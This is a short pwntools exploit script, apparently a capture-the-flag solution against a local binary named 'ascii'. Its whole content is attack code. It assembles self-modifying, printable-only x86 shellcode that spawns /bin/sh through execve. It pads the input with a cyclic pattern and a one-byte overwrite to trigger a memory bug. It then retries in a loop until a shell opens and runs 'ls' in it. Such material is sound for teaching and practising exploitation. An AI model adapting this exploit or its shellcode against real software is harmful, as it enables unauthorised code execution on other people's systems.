from pwn import *

context.log_level = 'debug'

exe = ELF('./ascii')
# r = exe.process()
# gdb.attach(r)

printable_shellcode = """
push 0x30\n\t
pop  eax\n\t
xor  al, 0x30\n\t
push eax\n\t
pop ebx\n\t
dec ebx\n\t
sub eax, 0x274f4477\n\t
sub eax, 0x30706b2a\n\t
sub eax, 0x2840505f\n\t
xor [eax+0x3c], bl\n\t
xor [eax+0x3d], bl\n\t
push 0x30\n\t
pop  eax\n\t
xor  al, 0x30\n\t
push eax\n\t
push 0x68732f6e\n\t
push 0x69622f2f\n\t
push esp\n\t
pop  ebx\n\t
push 0x30\n\t
pop  eax\n\t
xor  al, 0x30\n\t
push eax\n\t
pop  ecx\n\t
push eax\n\t
pop  edx\n\t
xor  al, 0x31\n\t
xor  al, 0x3a\n\t
"""
printable_shellcode = asm(printable_shellcode) + b'\x32\x7f'
count = 0
while True:
    print(count)
    r = exe.process()
    count += 1
    time.sleep(0.001)
    r.send(printable_shellcode + cyclic(0xA8 - len(printable_shellcode)) + b'\x04')
    r.recvuntil(b'Input text : triggering bug...\n')
    try:
        r.sendline(b'ls')
        print(r.recv())
        r.interactive()
    except Exception as e:
        pass
    r.close()
